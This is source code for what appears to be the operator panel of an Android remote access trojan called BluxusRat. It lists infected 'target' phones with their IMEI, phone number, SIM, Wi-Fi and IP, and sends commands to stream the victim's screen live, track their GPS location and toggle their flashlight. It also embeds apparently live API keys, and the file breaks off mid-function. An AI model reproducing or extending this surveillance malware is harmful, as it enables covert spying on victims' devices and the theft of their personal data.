/* ============================================================
 * BluxusRat V1 [NewEra] — Script
 * ============================================================ */

// ============================================================
// FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
  apiKey: "AIzaSyBx7iNsKzUjiZh-cVnfw3Tl8AYPz_xjH7A",
  authDomain: "ratt-ceee0.firebaseapp.com",
  databaseURL: "https://ratt-ceee0-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "ratt-ceee0",
  storageBucket: "ratt-ceee0.firebasestorage.app",
  messagingSenderId: "767485162301",
  appId: "1:767485162301:web:3800f71fc8c6bb35db8b54",
  measurementId: "G-7LWR6QTLCJ"
};

// ============================================================
// CONFIG API
// ============================================================
const CONFIG = {
  FAZZ_KEY: "fcs_live_ff8116a26bea56e04330d6c249a26c3c88e9d4f1",
  FAZZ_API: "https://api.fazzcode.eu.cc/api",
  TERMAI_KEY: "AIzaBj7z2z3xBjsk",
  TERMAI_URL: "https://c.termai.cc",
  ANIME_API: "https://apii.nexadev.my.id/anime",
  ANIME_BANNER: "https://api.nexadev.my.id/api/random/anime",
  MAX_UPLOAD: 2 * 1024 * 1024
};

// ============================================================
// STATE
// ============================================================
const State = {
  user: null, uid: null, page: "dash", targets: [],
  unsubLive: null, unsubLoc: null, currentTarget: null,
  audio: null, currentTrack: null,
  animeSearchMode: false, animeCurrentDetail: null,
  db: null
};

const LOADING_TEXTS = [
  "Connecting to Firebase...",
  "Loading assets...",
  "Preparing session...",
  "Almost ready..."
];

const $ = (s, p = document) => p.querySelector(s);
const $$ = (s, p = document) => [...p.querySelectorAll(s)];

let fbRef, fbSet, fbPush, fbUpdate, fbOnValue, fbGet, fbRemove;

// ============================================================
// HAPTIC
// ============================================================
function haptic(ms = 10) {
  try { if (navigator.vibrate) navigator.vibrate(ms); } catch (e) {}
}

// ============================================================
// LOAD FIREBASE SDK
// ============================================================
async function loadFirebaseSDK() {
  const appMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js");
  const dbMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js");
  fbRef = dbMod.ref;
  fbSet = dbMod.set;
  fbPush = dbMod.push;
  fbUpdate = dbMod.update;
  fbOnValue = dbMod.onValue;
  fbGet = dbMod.get;
  fbRemove = dbMod.remove;
  const app = appMod.initializeApp(firebaseConfig);
  State.db = dbMod.getDatabase(app);
}

// ============================================================
// UTIL
// ============================================================
function isVIP() {
  return State.user && (
    State.user.role === "vip" ||
    State.user.role === "reseller" ||
    State.user.role === "owner"
  );
}

function showScreen(id) {
  $$(".screen").forEach(s => s.classList.remove("active"));
  const el = $("#screen-" + id);
  if (el) el.classList.add("active");
}

function toast(msg, type = "info", dur = 3000) {
  const wrap = $("#toast-wrap");
  const el = document.createElement("div");
  el.className = "toast " + (type === "info" ? "" : type);
  const ic = type === "ok" ? "fa-circle-check"
           : type === "err" ? "fa-circle-xmark"
           : type === "warn" ? "fa-triangle-exclamation"
           : "fa-circle-info";
  el.innerHTML = `<div class="ico-badge"><i class="fa-solid ${ic}"></i></div><span>${msg}</span>`;
  wrap.appendChild(el);
  setTimeout(() => {
    el.style.opacity = "0";
    el.style.transform = "translateY(-12px) scale(.95)";
    el.style.transition = ".3s";
    setTimeout(() => el.remove(), 300);
  }, dur);
}

function fmtDate(ts) {
  if (!ts) return "—";
  return new Date(ts).toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" });
}

function fmtDateTime(ts) {
  if (!ts) return "—";
  const d = new Date(ts);
  return d.toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" })
    + " " + d.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
}

function fmtTime(ts) {
  const d = new Date(ts);
  return `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
}

function timeAgo(ts) {
  if (!ts) return "—";
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + "s ago";
  if (s < 3600) return Math.floor(s / 60) + "m ago";
  if (s < 86400) return Math.floor(s / 3600) + "h ago";
  return Math.floor(s / 86400) + "d ago";
}

function fmtSize(bytes) {
  if (!bytes) return "—";
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  return (bytes / 1048576).toFixed(2) + " MB";
}

function cleanTitle(t) {
  if (!t) return "";
  return t.split("\t")[0].trim();
}

// Nama device pake BRAND (dari owner side)
function getDeviceName(t) {
  if (!t) return "Unknown Device";
  if (t.brand && t.brand !== "Unknown" && t.brand !== "") {
    return t.brand.charAt(0).toUpperCase() + t.brand.slice(1).toLowerCase();
  }
  if (t.model && t.model !== "Unknown") return t.model;
  return "Unknown Device";
}

// Cek Android version >= 11 (SDK >= 30)
function isAndroid11Plus(t) {
  if (!t) return false;
  const sdk = parseInt(t.sdk || "0");
  return sdk >= 30;
}

async function sha256(text) {
  const buf = new TextEncoder().encode(text);
  const hash = await crypto.subtle.digest("SHA-256", buf);
  return [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2, "0")).join("");
}

function genSalt() {
  const arr = new Uint8Array(16);
  crypto.getRandomValues(arr);
  return [...arr].map(b => b.toString(16).padStart(2, "0")).join("");
}

function genUserCode() {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const gen = () => [...crypto.getRandomValues(new Uint8Array(4))].map(b => chars[b % chars.length]).join("");
  return `${gen()}-${gen()}-${gen()}-${gen()}`;
}

async function copyToClipboard(text) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (e) {}
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.left = "-9999px";
    ta.style.top = "0";
    ta.setAttribute("readonly", "");
    document.body.appendChild(ta);
    ta.select();
    ta.setSelectionRange(0, ta.value.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(ta);
    return ok;
  } catch (e) { return false; }
}

// ============================================================
// CONNECTION
// ============================================================
function setDot(s) {
  const d = $("#conn-dot");
  d.classList.remove("warn", "off");
  if (s === "warn") d.classList.add("warn");
  if (s === "off") d.classList.add("off");
}

function showOffline() { $("#offline-popup").classList.add("show"); }
function hideOffline() { $("#offline-popup").classList.remove("show"); }

window.addEventListener("offline", () => { setDot("off"); showOffline(); });
window.addEventListener("online", () => { setDot("ok"); hideOffline(); });

function watchConnection() {
  fbOnValue(fbRef(State.db, ".info/connected"), (snap) => {
    if (snap.val() === true) { setDot("ok"); hideOffline(); }
    else { setDot("warn"); }
  });
  setInterval(() => {
    if (!navigator.onLine) { setDot("off"); showOffline(); }
  }, 3000);
}

// ============================================================
// LOADING
// ============================================================
function runLoading() {
  showScreen("loading");
  const fill = $("#progress-fill");
  const txt = $("#loading-text");
  fill.style.width = "0%";
  let idx = 0;
  txt.textContent = LOADING_TEXTS[0];
  let pct = 0;
  const step = setInterval(() => {
    pct += Math.random() * 12 + 4;
    if (pct >= 100) { pct = 100; clearInterval(step); }
    fill.style.width = pct + "%";
  }, 180);
  const ltxt = setInterval(() => {
    idx = (idx + 1) % LOADING_TEXTS.length;
    txt.style.opacity = "0";
    setTimeout(() => {
      txt.textContent = LOADING_TEXTS[idx];
      txt.style.opacity = "1";
    }, 180);
  }, 800);
  setTimeout(() => {
    clearInterval(ltxt);
    fill.style.width = "100%";
    setTimeout(() => showScreen("login"), 500);
  }, 2400);
}

// ============================================================
// AUTH
// ============================================================
async function doLogin() {
  haptic(15);
  const usn = $("#login-usn").value.trim();
  const pw = $("#login-pw").value;
  if (!usn || !pw) return toast("Isi username & password", "err");
  const btn = $("#btn-login");
  btn.disabled = true;
  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
  try {
    const snap = await fbGet(fbRef(State.db, "users"));
    if (!snap.exists()) throw new Error("Belum ada user terdaftar");
    const users = snap.val();
    let foundUid = null, foundUser = null;
    for (const uid in users) {
      if (users[uid].username === usn) { foundUid = uid; foundUser = users[uid]; break; }
    }
    if (!foundUser) throw new Error("Username tidak ditemukan");
    if (foundUser.banned) throw new Error("Akun di-ban");
    const hash = await sha256(pw + foundUser.passwordSalt);
    if (hash !== foundUser.passwordHash) throw new Error("Password salah");
    if (foundUser.expiresAt && foundUser.expiresAt < Date.now()) throw new Error("Akun expired");
    await fbUpdate(fbRef(State.db, "users/" + foundUid), { lastLogin: Date.now() });
    State.uid = foundUid;
    State.user = foundUser;
    localStorage.setItem("bluxus_uid", foundUid);
    toast("Login berhasil", "ok");
    setTimeout(() => goDashboard(), 400);
  } catch (e) {
    toast(e.message || "Login gagal", "err");
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> Login';
  }
}

async function tryResume() {
  const uid = localStorage.getItem("bluxus_uid");
  if (!uid) return false;
  try {
    const snap = await fbGet(fbRef(State.db, "users/" + uid));
    if (!snap.exists()) return false;
    const u = snap.val();
    if (u.banned) return false;
    if (u.expiresAt && u.expiresAt < Date.now()) return false;
    State.uid = uid;
    State.user = u;
    return true;
  } catch (e) { return false; }
}

// ============================================================
// DASHBOARD
// ============================================================
async function goDashboard() {
  showScreen("dash");
  const u = State.user || {};
  $("#dash-usn").textContent = u.username || "—";
  const role = u.role || "member";
  const roleEl = $("#dash-role");
  roleEl.className = "role " + role;
  roleEl.innerHTML = `<i class="fa-solid fa-user"></i> ${role}`;
  $("#dash-usercode").textContent = u.userCode || "—";
  $("#dash-welcome-name").textContent = u.username || "User";
  const badge = $("#dash-badge");
  badge.textContent = role.toUpperCase();
  badge.className = "wb-badge" + (role === "vip" ? " vip" : "");
  $("#sb-sub").textContent = u.username || "—";
  if (role !== "member") {
    $("#sb-role-sep").classList.remove("hidden");
    $("#sb-panel").classList.remove("hidden");
  } else {
    $("#sb-role-sep").classList.add("hidden");
    $("#sb-panel").classList.add("hidden");
  }
  markSidebar("dash");
  await loadTargets();
  loadAnnouncement();
}

function markSidebar(page) {
  $$(".sb-item").forEach(el => el.classList.toggle("active", el.dataset.page === page));
}

function openSidebar() {
  haptic(8);
  $("#sidebar").classList.add("open");
  $("#sidebar-backdrop").classList.add("show");
}

function closeSidebar() {
  $("#sidebar").classList.remove("open");
  $("#sidebar-backdrop").classList.remove("show");
}

function goPage(page) {
  haptic(8);
  closeSidebar();
  markSidebar(page);
  State.page = page;
  if (page === "dash") return goDashboard();
  if (page === "rat") return goRat();
  if (page === "anime") return goAnime();
  if (page === "tools") return goTools();
  if (page === "account") return goAccount();
  if (page === "about") return showScreen("about");
  if (page === "panel") return goPanel();
}

// ============================================================
// ANNOUNCEMENT
// ============================================================
async function loadAnnouncement() {
  const wrap = $("#announce-wrap");
  if (!wrap) return;
  try {
    const snap = await fbGet(fbRef(State.db, "broadcasts"));
    if (!snap.exists()) { wrap.innerHTML = ""; return; }
    const arr = Object.entries(snap.val())
      .map(([id, v]) => ({ id, ...v }))
      .sort((a, b) => b.createdAt - a.createdAt);
    const l = arr[0];
    if (!l) { wrap.innerHTML = ""; return; }
    wrap.innerHTML = `
      <div class="announce-card" id="announce-card">
        ${l.image ? `<img src="${l.image}" onerror="this.style.display='none'">` : ""}
        <div class="ac-body">
          <div class="ac-label"><i class="fa-solid fa-bullhorn"></i> Pengumuman</div>
          <div class="ac-title">${l.title || "Info Terbaru"}</div>
          <div class="ac-desc">${l.message || ""}</div>
        </div>
      </div>`;
    $("#announce-card").onclick = () => {
      haptic(8);
      if (l.url) { window.open(l.url, "_blank"); return; }
      openAnnouncementModal(l);
    };
  } catch (e) {}
}

function openAnnouncementModal(b) {
  const box = $("#modal-box");
  box.innerHTML = `
    ${b.image ? `<div style="border-radius:14px;overflow:hidden;margin:-8px -8px 16px"><img src="${b.image}" style="width:100%;display:block" onerror="this.style.display='none'"></div>` : ""}
    <h3>${b.title || "Pengumuman"}</h3>
    <div class="sub">${fmtDateTime(b.createdAt)}</div>
    <div style="font-size:13px;color:var(--text);line-height:1.7;white-space:pre-wrap">${b.message || ""}</div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
}

// ============================================================
// TARGETS / RAT
// ============================================================
async function loadTargets() {
  try {
    const snap = await fbGet(fbRef(State.db, "targets"));
    const all = snap.exists() ? snap.val() : {};
    const myCode = State.user.userCode;
    State.targets = [];
    for (const tid in all) {
      const t = all[tid];
      if (t.ownerCode === myCode) State.targets.push({ id: tid, ...t });
    }
    $("#dash-targets").textContent = State.targets.length;
    $("#dash-online").textContent = State.targets.filter(t => t.status === "online").length;
    renderTargetList();
  } catch (e) {}
}

function renderTargetList() {
  const list = $("#target-list");
  if (!list) return;
  if (State.targets.length === 0) {
    list.innerHTML = `
      <div style="text-align:center;padding:30px 20px;color:var(--text-dim)">
        <i class="fa-solid fa-satellite-dish" style="font-size:42px;display:block;margin-bottom:12px;opacity:.3"></i>
        <div style="font-size:12px">Belum ada target</div>
        <div style="font-size:10px;color:var(--text-mute);margin-top:4px">Kirim APK ke target buat mulai</div>
      </div>`;
    return;
  }
  list.innerHTML = State.targets.map(t => {
    const online = t.status === "online";
    const bat = t.battery || 0;
    const low = bat < 20;
    const batIcon = bat > 75 ? "full" : bat > 50 ? "three-quarters" : bat > 25 ? "half" : "quarter";
    const deviceName = getDeviceName(t);  // ← PAKE BRAND
    return `
      <div class="target-item" data-tid="${t.id}">
        <div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div>
        <div class="ti-info">
          <div class="n">${deviceName}</div>
          <div class="d">
            <span>${t.ip || "—"}</span>
            ${t.battery ? `<span class="battery-badge ${low ? "low" : ""}"><i class="fa-solid fa-battery-${batIcon}"></i>${bat}%</span>` : ""}
            <span>${timeAgo(t.lastSeen)}</span>
          </div>
        </div>
        <div class="ti-status ${online ? "on" : "off"}"><span class="d"></span>${online ? "ON" : "OFF"}</div>
      </div>`;
  }).join("");
  $$(".target-item").forEach(el => el.onclick = () => {
    haptic(10);
    openTargetDetail(el.dataset.tid);
  });
}

function goRat() {
  showScreen("rat");
  const uc = $("#rat-usercode");
  uc.textContent = State.user.userCode || "—";
  const btn = $("#btn-copy-usercode");
  btn.classList.remove("copied");
  btn.innerHTML = '<i class="fa-solid fa-copy"></i>';
  loadTargets();
}

function openTargetDetail(tid) {
  const t = State.targets.find(x => x.id === tid);
  if (!t) return;
  State.currentTarget = t;
  
  const deviceName = getDeviceName(t);
  const androidVer = t.android || "?";
  const canLiveCam = isAndroid11Plus(t);  // ← CEK ANDROID VERSION
  
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>${deviceName}</h3>
    <div class="sub">ID: ${tid}</div>
    <div class="tabs">
      <button data-tab="info" class="active"><i class="fa-solid fa-circle-info"></i> Info</button>
      <button data-tab="live"><i class="fa-solid fa-desktop"></i> Live</button>
      <button data-tab="locate"><i class="fa-solid fa-location-dot"></i> Locate</button>
      <button data-tab="tools"><i class="fa-solid fa-toolbox"></i> Tools</button>
    </div>
    <div class="tab-panel active" data-panel="info">
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Status</span><span style="color:${t.status === 'online' ? 'var(--success)' : 'var(--text-dim)'};font-weight:700">${(t.status || "offline").toUpperCase()}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Brand</span><span style="font-weight:600">${t.brand || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Model</span><span style="font-weight:600">${t.model || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IP</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace">${t.ip || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Android</span><span style="font-weight:600">${androidVer}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">SDK</span><span style="font-weight:600">${t.sdk || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IMEI</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace;font-size:11px">${t.imei || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">SIM</span><span style="font-weight:600">${t.simOperator || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Phone</span><span style="font-weight:600">${t.phoneNumber || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Battery</span><span style="font-weight:600">${t.battery ? t.battery + "%" : "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Wifi</span><span style="font-weight:600;font-size:11px">${t.wifiSSID || "—"}</span></div>
      <div style="height:1px;background:var(--border)"></div>
      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Last Seen</span><span style="font-weight:600">${timeAgo(t.lastSeen)}</span></div>
    </div>
    <div class="tab-panel" data-panel="live">
      <div class="toggle-row ${canLiveCam ? "" : "disabled"}" ${canLiveCam ? "" : 'style="opacity:.5"'}>
        <div class="tr-left">
          <div class="ico-badge"><i class="fa-solid fa-video"></i></div>
          <div class="tr-info">
            <div class="n">Live Cam</div>
            <div class="d">${canLiveCam ? "Stream layar target" : "Cuma work di Android 11+"}</div>
          </div>
        </div>
        <label class="switch">
          <input type="checkbox" id="sw-live" ${canLiveCam ? "" : "disabled"}>
          <span class="slider"></span>
        </label>
      </div>
      ${!canLiveCam ? `<div style="font-size:11px;color:var(--warning);padding:10px;background:var(--warning-soft);border-radius:8px;margin-top:8px;text-align:center"><i class="fa-solid fa-triangle-exclamation"></i> Target pake Android ${androidVer} (SDK ${t.sdk || "?"}). Live Cam cuma support Android 11+ (SDK 30+).</div>` : ""}
      <div class="live-view" id="live-view" style="margin-top:12px">
        <div class="empty"><i class="fa-solid fa-image"></i><div>${canLiveCam ? "Live cam nonaktif" : "Tidak tersedia"}</div></div>
      </div>
    </div>
    <div class="tab-panel" data-panel="locate">
      <div class="toggle-row">
        <div class="tr-left">
          <div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div>
          <div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div>
        </div>
        <label class="switch">
          <input type="checkbox" id="sw-loc"><span class="slider"></span>
        </label>
      </div>
      <div class="loc-map" id="loc-map">
        <div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>
      </div>
      <div class="loc-coords" id="loc-coords">—</div>
    </div>
    <div class="tab-panel" data-panel="tools">
      <div class="toggle-row">
        <div class="tr-left">
          <div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div>
          <div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div>
        </div>
        <label class="switch">
          <input type="checkbox" id="sw-flash"><span class="slider"></span>
        </label>
      </div>
      <div class="toggle-row">
        <div class="tr-left">
          <div class="ico-badge"><i class="fa-solid fa-bolt"></i></div>
          <div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip tiap 1 detik</div></div>
        </div>
        <label class="switch">
          <input type="checkbox" id="sw-strobo"><span class="slider"></span>
        </label>
      </div>
    </div>
    <div class="modal-actions">
      <button class="btn btn-danger" id="btn-delete-target"><i class="fa-solid fa-trash"></i> Hapus</button>
      <button class="btn btn-ghost" onclick="closeModal()">Tutup</button>
    </div>`;
  $("#modal").classList.add("show");
  
  // Tab switching
  $$(".tabs button", box).forEach(b => {
    b.onclick = () => {
      haptic(5);
      $$(".tabs button", box).forEach(x => x.classList.remove("active"));
      b.classList.add("active");
      const tab = b.dataset.tab;
      $$(".tab-panel", box).forEach(p => p.classList.toggle("active", p.dataset.panel === tab));
      if (tab === "live" && canLiveCam) setupLiveScreen(tid);
      if (tab === "locate") setupLocate(tid);
    };
  });
  
  // Toggle events
  if (canLiveCam) {
    $("#sw-live", box).onchange = (e) => toggleLive(tid, e.target.checked);
  }
  $("#sw-loc", box).onchange = (e) => toggleLocate(tid, e.target.checked);
  $("#sw-flash", box).onchange = (e) => toggleFlash(tid, e.target.checked);
  $("#sw-strobo", box).onchange = (e) => toggleStrobo(tid, e.target.checked);
  
  // Tombol hapus target
  $("#btn-delete-target").onclick = async () => {
    haptic(20);
    if (!confirm(`Hapus target "${deviceName}"?\n\nSemua data (commands, live, locations) akan dihapus.`)) return;
    try {
      await fbRemove(fbRef(State.db, "targets/" + tid));
      await fbRemove(fbRef(State.db, "commands/" + tid));
      await fbRemove(fbRef(State.db, "live/" + tid));
      await fbRemove(fbRef(State.db, "locations/" + tid));
      toast("Target dihapus", "ok");
      closeModal();
      loadTargets();
    } catch (e) {
      toast("Gagal hapus: " + e.message, "err");
    }
  };
}

async function sendCommand(tid, type, payload = {}) {
  try {
    const cmdRef = fbPush(fbRef(State.db, "commands/" + tid));
    await fbSet(cmdRef, {
      type, payload,
      fromUid: State.uid,
      status: "pending",
      createdAt: Date.now()
    });
    return true;
  } catch (e) {
    toast("Gagal kirim command", "err");
    return false;
  }
}

async function toggleLive(tid, on) {
  haptic(15);
  if (on) {
    await sendCommand(tid, "live_on", { fps: 2 });
    toast("Live cam aktif", "ok");
    setupLiveScreen(tid);
  } else {
    await sendCommand(tid, "live_off");
    toast("Live cam nonaktif", "info");
    if (State.unsubLive) { State.unsubLive(); State.unsubLive = null; }
    const v = $("#live-view");
    if (v) v.innerHTML = '<div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>';
  }
}

function setupLiveScreen(tid) {
  if (State.unsubLive) State.unsubLive();
  State.unsubLive = fbOnValue(fbRef(State.db, "live/" + tid), (snap) => {
    if (!snap.exists()) return;
    const d = snap.val();
    if (d.frame) {
      const v = $("#live-view");
      if (v) v.innerHTML = `<img src="${d.frame}" alt="live">`;
    }
  });
}

async function toggleLocate(tid, on) {
  haptic(15);
  if (on) {
    await sendCommand(tid, "locate");
    toast("Meminta lokasi...", "info");
    setupLocate(tid);
  } else {
    await sendCommand(tid, "locate_off");
    if (State.unsubLoc) { State.unsubLoc(); State.unsubLoc = null; }
    const m = $("#loc-map");
    if (m) m.innerHTML = '<div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>';
    const c = $("#loc-coords");
    if (c) c.textContent = "—";
  }
}

function setupLocate(tid) {
  if (State.unsubLoc) State.unsubLoc();
  State.unsubLoc = fbOnValue(fbRef(State.db, "locations/" + tid), (snap) => {
    if (!snap.exists()) return;
    const d = snap.val();
    if (d.lat && d.lng) {
      const m = $("#loc-map");
      if (m) m.innerHTML = `<iframe src="https://maps.google.com/maps?q=${d.lat},${d.lng}&z=16&output=embed"></iframe>`;
      const c = $("#loc-coords");
      if (c) c.textContent = `${d.lat}, ${d.lng}`;
    }
  });
}

async function toggleFlash(tid, on) {
  haptic(15);
  await sendCommand(tid, on ? "flashlight_on" : "flashlight_off");
  toast(on ? "Senter nyala" : "Senter mati", "ok");
}

async function toggleStrobo(tid, on) {
  haptic(15);
  await sendCommand(tid, on ? "strobo_on" : "strobo_off");
  toast(on ? "Strobo nyala" : "Strobo mati", "ok");
}

// ============================================================
// BLUXANIME
// ============================================================
async function goAnime() {
  showScreen("anime");
  State.animeSearchMode = false;
  $("#anime-search-inline").classList.remove("show");
  loadAnimeBanner();
  loadAnimeRows();
}

async function loadAnimeBanner() {
  const img = $("#anime-banner-img");
  if (img) img.src = CONFIG.ANIME_BANNER + "?t=" + Date.now();
}

async function loadAnimeRows() {
  const rows = $("#anime-rows");
  rows.innerHTML = '<div class="anime-loading"><div class="sp"></div><span>Loading anime...</span></div>';
  try {
    const [recent, recent2, completed] = await Promise.all([
      fetch(`${CONFIG.ANIME_API}?recent=1&page=1`).then(r => r.json()).catch(() => null),
      fetch(`${CONFIG.ANIME_API}?recent=1&page=2`).then(r => r.json()).catch(() => null),
      fetch(`${CONFIG.ANIME_API}?completed=1&page=1`).then(r => r.json()).catch(() => null)
    ]);
    const trending = dedupe(recent?.data?.animeList || []);
    const newRel = dedupe(recent2?.data?.animeList || []);
    const comp = dedupe(completed?.data?.animeList || []);
    let html = "";
    const cont = getContinueWatching();
    if (cont.length > 0) html += renderAnimeRow("📺 Lanjutkan Nonton", cont);
    if (trending.length) html += renderAnimeRow("🔥 Trending Today", trending);
    if (newRel.length) html += renderAnimeRow("✨ New Release", newRel);
    if (comp.length) html += renderAnimeRow("✅ Completed", comp);
    if (!html) html = '<div class="anime-empty"><i class="fa-solid fa-tv"></i>Gagal load anime</div>';
    rows.innerHTML = html;
    bindAnimeCards();
  } catch (e) {
    rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-triangle-exclamation"></i>Gagal load anime</div>';
  }
}

function dedupe(arr) {
  const seen = new Set();
  const out = [];
  for (const a of arr) {
    if (!a || !a.link) continue;
    if (seen.has(a.link)) continue;
    seen.add(a.link);
    out.push(a);
  }
  return out;
}

function renderAnimeRow(title, items) {
  return `<div class="anime-row">
    <div class="anime-row-head"><div class="t">${title}</div></div>
    <div class="anime-row-scroll">${items.map(a => renderAnimeCard(a)).join("")}</div>
  </div>`;
}

function renderAnimeCard(a) {
  const title = cleanTitle(a.title);
  const type = a.type || "TV";
  const ep = a.latestEpisode || a.totalEpisode || "";
  return `<div class="anime-card" data-link="${a.link}" data-title="${title}" data-image="${a.image}" data-type="${type}">
    <div class="cover">
      <img src="${a.image}" onerror="this.style.background='var(--bg-card)'">
      <span class="type-badge">${type}</span>
      ${ep ? `<span class="ep-badge">${ep}</span>` : ""}
    </div>
    <div class="title">${title}</div>
  </div>`;
}

function bindAnimeCards() {
  $$(".anime-card").forEach(el => {
    el.onclick = () => {
      haptic(10);
      openAnimeDetail(el.dataset.link, el.dataset.title, el.dataset.image, el.dataset.type);
    };
  });
}

async function searchAnime(q) {
  if (!q.trim()) return;
  const rows = $("#anime-rows");
  rows.innerHTML = '<div class="anime-loading"><div class="sp"></div><span>Mencari...</span></div>';
  State.animeSearchMode = true;
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?search=${encodeURIComponent(q)}`);
    const data = await res.json();
    const list = dedupe(data?.data?.results || []);
    if (list.length === 0) {
      rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-magnifying-glass"></i>Anime tidak ditemukan</div>';
      return;
    }
    rows.innerHTML = `<div class="anime-search-grid">${list.map(a => renderAnimeCard(a)).join("")}</div>`;
    bindAnimeCards();
  } catch (e) {
    rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-triangle-exclamation"></i>Gagal mencari</div>';
  }
}

async function openAnimeDetail(link, title, image, type) {
  const box = $("#modal-box");
  box.innerHTML = `<div class="anime-loading"><div class="sp"></div><span>Loading detail...</span></div>`;
  $("#modal").classList.add("show");
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?details=${encodeURIComponent(link)}`);
    const data = await res.json();
    const d = data?.data;
    if (!d) throw new Error("No data");
    State.animeCurrentDetail = d;
    const genres = (d.genres || []).map(g => `<span class="g">${g}</span>`).join("");
    const info = d.info || {};
    const episodes = (d.episodes || []).map(e => {
      const epNum = e.episode.replace(/[^0-9]/g, "") || "?";
      return `<div class="ad-ep" data-epurl="${e.episodeUrl}" data-eptitle="${e.title}">
        <div class="ep-num">${epNum}</div>
        <div class="ep-info"><div class="t">${e.title}</div><div class="d">${e.date || ""}</div></div>
        <div class="ep-play"><i class="fa-solid fa-play"></i></div>
      </div>`;
    }).join("");
    box.innerHTML = `
      <div class="anime-detail">
        <div class="ad-hero"><img src="${d.image}" onerror="this.style.display='none'"></div>
        <div class="ad-title">${d.title}</div>
        <div class="ad-genres">${genres}</div>
        <div class="ad-info">
          <div class="i"><div class="l">Status</div><div class="v">${info.Status || "—"}</div></div>
          <div class="i"><div class="l">Studio</div><div class="v">${info.Studio || "—"}</div></div>
          <div class="i"><div class="l">Dirilis</div><div class="v">${info.Dirilis || "—"}</div></div>
          <div class="i"><div class="l">Tipe</div><div class="v">${info.Tipe || "—"}</div></div>
          <div class="i"><div class="l">Episode</div><div class="v">${info.Episode || "—"}</div></div>
          <div class="i"><div class="l">Durasi</div><div class="v">${info.Durasi || "—"}</div></div>
        </div>
        ${d.sinopsis ? `<div class="ad-synopsis">${d.sinopsis}</div>` : ""}
        <div class="ad-eps-label">Daftar Episode</div>
        <div class="ad-eps">${episodes || '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Belum ada episode</div>'}</div>
        <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>
      </div>`;
    $$(".ad-ep").forEach(el => {
      el.onclick = () => {
        haptic(8);
        playAnimeEpisode(el.dataset.epurl, el.dataset.eptitle, d);
      };
    });
  } catch (e) {
    box.innerHTML = `<h3>Gagal</h3><div class="sub">Tidak bisa memuat detail anime</div><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  }
}

async function playAnimeEpisode(epUrl, epTitle, detail) {
  const box = $("#modal-box");
